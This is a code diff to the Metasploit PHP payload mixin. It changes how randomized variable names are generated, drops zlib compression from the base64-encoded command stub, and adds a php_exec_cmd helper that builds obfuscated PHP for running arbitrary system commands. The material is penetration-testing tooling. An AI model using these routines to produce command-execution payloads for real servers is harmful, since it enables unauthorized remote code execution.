@@ -17,8 +17,10 @@ module Msf::Payload::Php
   # @return [String] A chunk of PHP code
   #
   def self.preamble(options = {})
-    dis = options[:disabled_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-    dis = '$' + dis if (dis[0,1] != '$')
+    vars = options.fetch(:vars_generator) { Rex::RandomIdentifier::Generator.new(language: :php) }
+
+    dis = options[:disabled_varname] || vars[:disabled_varname]
+    dis = "$#{dis}" unless dis.start_with?('$')
 
     # Canonicalize the list of disabled functions to facilitate choosing a
     # system-like function later.
@@ -55,21 +57,23 @@ module Msf::Payload::Php
   #   command.
   #
   def self.system_block(options = {})
-    cmd = options[:cmd_varname] || '$cmd'
-    dis = options[:disabled_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-    output = options[:output_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
+    vars = options.fetch(:vars_generator) { Rex::RandomIdentifier::Generator.new(language: :php) }
 
-    cmd    = '$' + cmd if (cmd[0,1] != '$')
-    dis    = '$' + dis if (dis[0,1] != '$')
-    output = '$' + output if (output[0,1] != '$')
+    cmd = options[:cmd_varname] || vars[:cmd_varname]
+    dis = options[:disabled_varname] || vars[:disabled_varname]
+    output = options[:output_varname] || vars[:output_varname]
 
-    is_callable = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-    in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
+    cmd    = '$' + cmd unless cmd.start_with?('$')
+    dis    = '$' + dis unless dis.start_with?('$')
+    output = '$' + output unless output.start_with?('$')
+
+    is_callable = vars[:is_callable_varname]
+    in_array    = vars[:in_array_varname]
 
     setup = ''
     if options[:cmd]
       setup << <<~TEXT
-        #{cmd}=gzuncompress(base64_decode('#{Rex::Text.encode_base64(Rex::Text.zlib_deflate(options[:cmd]))}'));
+        #{cmd}=base64_decode('#{Rex::Text.encode_base64(options[:cmd])}');
       TEXT
     end
     setup << <<~TEXT
@@ -151,6 +155,14 @@ module Msf::Payload::Php
 
   def php_system_block(options = {})
     Msf::Payload::Php.system_block(options)
+  end
+
+  def php_exec_cmd(cmd)
+    vars = Rex::RandomIdentifier::Generator.new(language: :php)
+    <<-END_OF_PHP_CODE
+      #{php_preamble(vars_generator: vars)}
+      #{php_system_block(vars_generator: vars, cmd: cmd)}
+    END_OF_PHP_CODE
   end
 
   def self.create_exec_stub(php_code, options = {})
